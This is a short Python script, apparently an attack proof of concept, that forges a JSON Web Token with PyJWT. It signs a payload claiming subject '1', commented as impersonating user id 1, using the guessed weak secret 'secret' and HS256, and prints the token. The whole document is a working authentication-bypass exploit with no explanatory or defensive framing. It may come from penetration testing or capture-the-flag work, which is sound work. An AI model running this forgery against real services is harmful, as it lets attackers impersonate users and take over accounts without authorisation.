import jwt
import datetime

forged_token = jwt.encode(
    {
        "sub": "1",  # impersonating user id 1
        "type": "access",
        "iat": datetime.datetime.utcnow(),
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
        "fresh": False
    },
    "secret",  # the guessed/known weak secret
    algorithm="HS256"
)
print(forged_token)